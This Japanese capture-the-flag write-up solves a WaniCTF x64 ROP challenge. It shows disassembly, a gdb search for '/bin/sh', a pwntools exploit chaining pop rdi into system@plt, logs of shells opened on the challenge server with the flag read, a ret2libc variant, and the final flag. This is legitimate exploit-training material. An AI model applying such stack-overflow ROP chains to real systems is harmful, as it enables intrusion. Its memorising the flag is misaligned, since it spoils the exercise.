# rop func call:PWN:pts
nc rop.wanictf.org 9006  
- x64の関数呼び出しと、Return Oriented Programming (ROP)を理解する必要があります。  
- x64の関数呼び出しでは第一引数がRDI、第二引数がRSI、第三引数がRDXに設定する必要があります。  
- pwntoolsを使わないと解くのは大変だと思います。  
- 念のためpwntoolsのサンプルプログラム「pwn06_sample.py」を載せておきました。  

使用ツール例  
- [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)  
- [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)  
- [ROPgadget](https://github.com/wani-hackase/memo-setup-pwn-utils#ROPgadget)  

セキュリティ保護  
- Partial RELocation ReadOnly (RELRO)  
- Stack Smash Protection (SSP)無効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)無効  

[pwn06](pwn06)　　　　[pwn06.c](pwn06.c)　　　　[pwn06_sample.py](pwn06_sample.py)  

# Solution
pwn06が配られるので、objdumpやgdbで見てみる。  
```bash
$ objdump -D pwn06
~~~
00000000004006c0 <system@plt>:
  4006c0:       ff 25 7a 09 20 00       jmpq   *0x20097a(%rip)        # 601040 <system@GLIBC_2.2.5>
  4006c6:       68 05 00 00 00          pushq  $0x5
  4006cb:       e9 90 ff ff ff          jmpq   400660 <.plt>
~~~
00000000004007e7 <vuln>:
  4007e7:       55                      push   %rbp
  4007e8:       48 89 e5                mov    %rsp,%rbp
  4007eb:       48 83 ec 10             sub    $0x10,%rsp
  4007ef:       48 8d 3d 82 02 00 00    lea    0x282(%rip),%rdi        # 400a78 <_IO_stdin_used+0x8>
  4007f6:       b8 00 00 00 00          mov    $0x0,%eax
  4007fb:       e8 d0 fe ff ff          callq  4006d0 <printf@plt>
  400800:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  400804:       ba 00 01 00 00          mov    $0x100,%edx
  400809:       48 89 c6                mov    %rax,%rsi
  40080c:       bf 00 00 00 00          mov    $0x0,%edi
  400811:       e8 da fe ff ff          callq  4006f0 <read@plt>
  400816:       89 45 fc                mov    %eax,-0x4(%rbp)
  400819:       8b 45 fc                mov    -0x4(%rbp),%eax
  40081c:       83 e8 01                sub    $0x1,%eax
  40081f:       48 98                   cltq
  400821:       c6 44 05 f2 00          movb   $0x0,-0xe(%rbp,%rax,1)
  400826:       48 8d 3d 43 08 20 00    lea    0x200843(%rip),%rdi        # 601070 <str_head>
  40082d:       e8 6e fe ff ff          callq  4006a0 <strlen@plt>
  400832:       48 89 c2                mov    %rax,%rdx
  400835:       48 8d 35 34 08 20 00    lea    0x200834(%rip),%rsi        # 601070 <str_head>
  40083c:       bf 00 00 00 00          mov    $0x0,%edi
  400841:       e8 4a fe ff ff          callq  400690 <write@plt>
  400846:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  40084a:       48 89 c7                mov    %rax,%rdi
  40084d:       e8 4e fe ff ff          callq  4006a0 <strlen@plt>
  400852:       48 89 c2                mov    %rax,%rdx
  400855:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  400859:       48 89 c6                mov    %rax,%rsi
  40085c:       bf 00 00 00 00          mov    $0x0,%edi
  400861:       e8 2a fe ff ff          callq  400690 <write@plt>
  400866:       48 8d 3d 0a 08 20 00    lea    0x20080a(%rip),%rdi        # 601077 <str_tail>
  40086d:       e8 2e fe ff ff          callq  4006a0 <strlen@plt>
  400872:       48 89 c2                mov    %rax,%rdx
  400875:       48 8d 35 fb 07 20 00    lea    0x2007fb(%rip),%rsi        # 601077 <str_tail>
  40087c:       bf 00 00 00 00          mov    $0x0,%edi
  400881:       e8 0a fe ff ff          callq  400690 <write@plt>
  400886:       48 89 ea                mov    %rbp,%rdx
  400889:       48 89 e0                mov    %rsp,%rax
  40088c:       48 89 d6                mov    %rdx,%rsi
  40088f:       48 89 c7                mov    %rax,%rdi
  400892:       e8 76 00 00 00          callq  40090d <debug_stack_dump>
  400897:       90                      nop
  400898:       c9                      leaveq
  400899:       c3                      retq

000000000040089a <main>:
  40089a:       55                      push   %rbp
  40089b:       48 89 e5                mov    %rsp,%rbp
  40089e:       b8 00 00 00 00          mov    $0x0,%eax
  4008a3:       e8 18 00 00 00          callq  4008c0 <init>
  4008a8:       48 8d 3d e1 01 00 00    lea    0x1e1(%rip),%rdi        # 400a90 <_IO_stdin_used+0x20>
  4008af:       e8 0c fe ff ff          callq  4006c0 <system@plt>
  4008b4:       b8 00 00 00 00          mov    $0x0,%eax
  4008b9:       e8 29 ff ff ff          callq  4007e7 <vuln>
  4008be:       eb f4                   jmp    4008b4 <main+0x1a>
~~~
0000000000601080 <binsh>:
  601080:       2f                      (bad)
  601081:       62                      (bad)
  601082:       69                      .byte 0x69
  601083:       6e                      outsb  %ds:(%rsi),(%dx)
  601084:       2f                      (bad)
  601085:       73 68                   jae    6010ef <_end+0x1f>
        ...
~~~
$ gdb pwn06
~~~
gdb-peda$ start
~~~
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 2 results, display max 2 items:
pwn06 : 0x601080 --> 0x68732f6e69622f ('/bin/sh')
 libc : 0x7fffff1b40fa --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ q
```
systemがあるのでrdiにbinshをセットした状態で呼んでやる。  
以下のpwnpwn06.pyで行う。  
```python:pwnpwn06.py
from pwn import *

elf = ELF('./pwn06')
io = remote("rop.wanictf.org", 9006)
#io = process(elf.path)
rop = ROP(elf)

system_plt = elf.plt['system']
binsh = elf.symbols['binsh']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

base = b'A' * 22
print(io.recvline())
payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_plt)
io.sendline(payload)

io.interactive()
```
実行する。  
```bash
$ python pwnpwn06.py
[*] '/pwn06'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to rop.wanictf.org on port 9006: Done
[*] Loaded 14 cached gadgets for './pwn06'
b'Welcome to rop function call!!!\n'
[*] Switching to interactive mode
What's your name?: hello AAAAAAAAAA7!

***start stack dump***
0x7fff08645660: 0x4141414141410000 <- rsp
0x7fff08645668: 0x0000003741414141
0x7fff08645670: 0x4141414141414141 <- rbp
0x7fff08645678: 0x000000000040065e <- return address
0x7fff08645680: 0x0000000000400a53
0x7fff08645688: 0x0000000000601080
0x7fff08645690: 0x00000000004006c0
***end stack dump***

$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
FLAG{learning-rop-and-x64-system-call}
$
[*] Interrupted
```
flagが得られた。  
当たり前だが、[one gadget rce](../one_gadget_rce)のpwnpwn07.pyのポートを変えたpwnpwn07x.pyでもシェルがとれる(ret2libc)。  
```bash
$ python pwnpwn07x.py
[*] '/pwn06'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to rop.wanictf.org on port 9006: Done
[*] Loaded 14 cached gadgets for './pwn06'
[*] puts@plt: 0x400680
[*] __libc_start_main: 0x600ff0
[*] pop rdi gadget: 0x400a53
[*] Leaked libc address,  __libc_start_main: 0x7f6a16fe3b10
[*] Address of libc 0x7f6a16fc2000
[*] /bin/sh 0x7f6a17175e1a
[*] system 0x7f6a17011550
[*] Switching to interactive mode
What's your name?: hello AAAAAAAAAA7!

***start stack dump***
0x7ffdddf845e0: 0x4141414141410000 <- rsp
0x7ffdddf845e8: 0x0000003741414141
0x7ffdddf845f0: 0x4141414141414141 <- rbp
0x7ffdddf845f8: 0x000000000040065e <- return address
0x7ffdddf84600: 0x0000000000400a53
0x7ffdddf84608: 0x00007f6a17175e1a
0x7ffdddf84610: 0x00007f6a17011550
***end stack dump***

$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
FLAG{learning-rop-and-x64-system-call}
$
[*] Interrupted
```

## FLAG{learning-rop-and-x64-system-call}